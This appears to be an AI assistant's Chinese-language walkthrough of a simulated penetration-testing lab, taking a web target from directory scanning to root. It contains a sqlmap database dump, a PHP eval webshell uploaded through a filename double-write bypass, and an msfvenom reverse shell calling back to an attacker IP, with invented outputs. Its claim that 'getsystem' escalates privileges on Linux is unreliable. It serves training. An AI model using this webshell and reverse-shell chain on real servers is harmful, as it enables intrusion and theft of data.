我为你设计了一道综合性的 Web 实战靶机题。这道题完美融合了我们讨论过的 dirsearch、sqlmap、Burp Suite（双写绕过）、蚁剑（AntSword）以及 Metasploit（MSF）。

你可以把这当作一次完整的模拟演练。

🎯 综合实战靶机：『Admin's Secret』
背景设定：
你拿到一个目标网站的 IP：http://192.168.50.10。
目标： 从普通的 Web 访问者，一步步拿到服务器系统的最高权限（Root），并读取 /root/flag.txt。

🛡️ Phase 1：信息收集与边界突破 (dirsearch + sqlmap)
面对一个只有首页的陌生网站，第一步永远是寻找隐藏的攻击面。

1. 目录扫描 (dirsearch)
你掏出 dirsearch 对目标进行扫描：

Bash
python3 dirsearch.py -u http://192.168.50.10 -e php,txt,zip
扫描结果发现了两个关键路径：

[200] /admin_login.php (后台登录页，但你不知道账号密码)

[200] /api/get_user.php?id=1 (一个测试用的 API 接口)

2. 数据库脱库 (sqlmap)
你敏锐地察觉到 get_user.php?id=1 可能存在 SQL 注入。直接把这个 URL 交给 sqlmap 接管：

Bash
# 探测数据库并直接爆出账号密码表
sqlmap -u "http://192.168.50.10/api/get_user.php?id=1" --dump -T users -D ctf_db
执行结果： sqlmap 成功跑出了管理员的明文账号密码：admin / admin_P@ssw0rd!。

(注：如果这里跑出的是 MD5 密文，你就可以用之前提到的 Weakpass 配合 Hydra 去爆破后台了！)

⚔️ Phase 2：黑名单绕过与 Getshell (Burp Suite + 蚁剑)
拿到账号密码后，你成功登录了 /admin_login.php，发现后台有一个“头像上传”功能。这通常是拿下服务器控制权（Getshell）的最佳突破口。

1. 抓包与绕过测试 (Burp Suite)
你写了一个一句话木马 <?php @eval($_POST['cmd']); ?>，保存为 shell.php 准备上传。
结果网页弹窗提示：Error: Illegal file extension ".php" removed!（错误：非法的后缀名 .php 已被删除！）。

这时候，你想起了双写绕过的知识点。后端的防御逻辑可能只是单纯地删除了 php 这三个字母。
你打开 Burp Suite 拦截上传请求，将文件名修改为：

HTTP
Content-Disposition: form-data; name="file"; filename="shell.pphphp"
执行过程： 服务器接收到 shell.pphphp，扫描到中间的 php 并删除，剩下的 p 和 hp 重新拼接，木马成功以 shell.php 的名字保存在了 /uploads/shell.php 目录下！

2. 连接 WebShell (蚁剑 AntSword)
你打开蚁剑，右键“添加数据”：

URL: http://192.168.50.10/uploads/shell.php

连接密码: cmd (木马里 $_POST 接收的参数)
测试连接成功！你双击进入文件管理，获得了服务器的初步控制权。

🚀 Phase 3：权限提升与后渗透 (Metasploit)
通过蚁剑打开虚拟终端，你输入 whoami，发现当前用户只是低权限的 www-data。你无法读取 /root/flag.txt。我们需要用 MSF 进行提权。

1. 生成反弹 Shell 木马 (msfvenom)
在你的攻击机上，使用 MSF 的独立组件生成一个 Linux 版本的反弹木马：

Bash
# LHOST 填你自己的 IP，LPORT 填你要监听的端口
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f elf > msf_shell.elf
2. 上传并执行木马 (通过蚁剑)

用蚁剑的文件管理功能，把 msf_shell.elf 上传到目标服务器的 /tmp/ 目录下（这个目录通常有读写权限）。

在蚁剑终端里赋予它执行权限：chmod +x /tmp/msf_shell.elf

3. 开启 MSF 监听并接管 (msfconsole)
在你的攻击机上启动 MSF，设置好捕获网兜：

Bash
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload linux/x86/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.50.5
msf6 > set LPORT 4444
msf6 > run
最后，在蚁剑终端里执行 /tmp/msf_shell.elf。
瞬间，你的 MSF 界面弹出了 Meterpreter session 1 opened！

4. 提权读取 Flag
进入 Meterpreter 后，你可以利用 MSF 强大的后渗透模块（比如利用内核漏洞或 SUID 提权模块）尝试获取 Root 权限：

Bash
meterpreter > getsystem  # 尝试自动提权
meterpreter > shell      # 进入系统原生 shell
root@ubuntu:~# cat /root/flag.txt
flag{w3b_t0_r00t_m4ster_2026!}
至此，靶机完美攻克！

这套 目录扫描 -> SQL注入 -> 绕过上传 -> 蚁剑连接 -> MSF提权 的流程，是真实渗透测试实习生必须熟练掌握的“基本功底”。
